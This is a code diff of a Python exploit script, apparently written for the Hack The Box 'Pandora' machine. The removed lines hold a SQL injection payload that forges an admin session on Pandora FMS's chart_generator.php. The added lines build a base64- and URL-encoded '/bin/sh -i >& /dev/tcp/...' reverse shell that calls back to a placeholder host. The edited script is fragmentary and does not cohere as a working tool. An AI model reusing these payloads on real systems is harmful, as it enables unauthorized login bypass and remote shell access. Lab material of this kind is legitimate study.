@@ -7,6 +7,7 @@
 ## ========= MODULES =========
 
 import argparse
+import base64
 import sys
 import time
 import socket
@@ -22,7 +23,6 @@ import sys
 import time
 import urllib.parse
 
-## ========= VARIABLE =========
 
 #### COLORS ####
 RED = "\033[1;91m"
@@ -31,81 +31,32 @@ BLUE = "\033[1;94m"
 GREEN = "\033[1;92m"
 END = "\033[1;m "
 
-## Set proxy [OPTIONAL]
-proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+lport = 443
 
 
-webName = '0xEtern4lW0lf'
-cookie = 'dat3q5otti0ib0cb5stra5k32c'
+## ========= VARIABLE =========
+s = ""
+def encodeB64(strg):
+    return base64.b64encode(strg.encode()).decode()
+
+payload = f"/bin/sh -i >& /dev/tcp/123456/123 0>&1"
+payload_encoded = str(encodeB64(payload))
+print('payload_encoded '+payload_encoded)
 
 
-## ========= FUNCTION =========
+## Create the payload
 
+print("[+] Creating the payload !! [+]")
 
-## Weaponization and Attack
+payload1 = f"/bin/sh -i >& /dev/tcp/123456/123 0>&1"
+  
+payload3 = base64.b64encode(payload1.encode("ascii")).decode("ascii")
 
-def bypassLogin(rhost,rport):
-    
-    print("[+] Bypass login session [+]")
-
-    global payload
-    payload = "a' UNION SELECT 'a',1,'id_usuario|s:5:\"admin\";' as data FROM tsessions_php WHERE '1'='1"
-
-    url = f"http://{rhost}:{rport}/pandora_console/include/chart_generator.php?session_id={payload}"
-
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate',
-        'Connection': 'close',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-User': '1',
-        }
-
-    cookies = {'PHPSESSID': cookie}
-
-    # Try to upload the PHP web shell to the server
-
-    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
+print(f"Encoded string: {payload3}")
 
 
 
 
-def main():
-    # Parse Arguments
-    parser = argparse.ArgumentParser()
-    parser = argparse.ArgumentParser(description='GetShell - Pandora / HTB - 0xEtern4lW0lf')
-    parser.add_argument('-t', '--target', help='Target IP address or hostname', type=str, required=True)
-    parser.add_argument('-p','--rport', help="Port of the target machine.", type=int, required=True)
-    parser.add_argument('-li', '--lhost', help='Local IP address or hostname', type=str, required=True)
-    parser.add_argument('-lp', '--lport', help='Local Port to receive the shell', type=int, required=True)
+payloadd = urllib.parse.quote(payload_encoded)
 
-    args = parser.parse_args()
-
-    rhost = args.target
-    rport = args.rport
-    lhost = args.lhost
-    lport = args.lport
-
-
-    print('BYPASSLOGIN')
-
-    bypassLogin(rhost,rport)
-
-
-    # Print some information
-    print("\n[+] Setting information")
-    print("[+] lhost: ", lhost)
-    print("[+] lport: ", lport)
-    print("[+] rhost: ", rhost)
-    print("[+] rport: ", rport)
-    print("[+] payload: ", payload)
-
-
-    
-if __name__ == '__main__':
-    main()
+print("payloadd: "+payloadd)
